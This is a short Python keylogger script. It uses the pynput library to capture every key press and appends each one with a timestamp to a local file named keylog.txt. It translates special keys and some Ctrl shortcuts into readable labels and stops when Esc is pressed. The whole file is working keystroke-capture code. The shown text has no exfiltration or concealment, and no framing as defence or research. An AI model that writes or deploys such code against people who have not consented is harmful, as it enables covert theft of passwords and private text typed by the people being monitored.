from pynput.keyboard import Key, Listener
import logging

log_directory = "./"
log_file = "keylog.txt"
logging.basicConfig(filename=(log_directory + log_file), level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Track the state of the control key and caps lock status
ctrl_pressed = False
caps_lock_active = False

def interpret_key_press(key):
    """Translate special key presses and combinations into readable format."""
    global ctrl_pressed
    if key == Key.ctrl_l or key == Key.ctrl_r:
        ctrl_pressed = True
        return 'Ctrl'
    elif key == Key.space:
        return 'Space'
    elif key == Key.enter:
        return 'Enter'
    elif key == Key.backspace:
        return 'Backspace'
    elif key == Key.caps_lock:
        return 'Caps Lock Toggled'
    elif hasattr(key, 'char') and key.char:
        if ctrl_pressed:
            if key.char == '\x01':  # Ctrl+A
                return 'Select All (Ctrl+A)'
            elif key.char == '\x03':  # Ctrl+C
                return 'Copy (Ctrl+C)'
            elif key.char == '\x16':  # Ctrl+V
                return 'Paste (Ctrl+V)'
        return f'Key pressed: {key.char}'
    return f'Special key pressed: {key}'

def on_press(key):
    action = interpret_key_press(key)
    if action:
        logging.info(action)

def on_release(key):
    global ctrl_pressed
    if key == Key.ctrl_l or key == Key.ctrl_r:
        ctrl_pressed = False
    if key == Key.caps_lock:
        global caps_lock_active
        caps_lock_active = not caps_lock_active  # Toggle Caps Lock state
    if key == Key.esc:
        # Stop listener
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
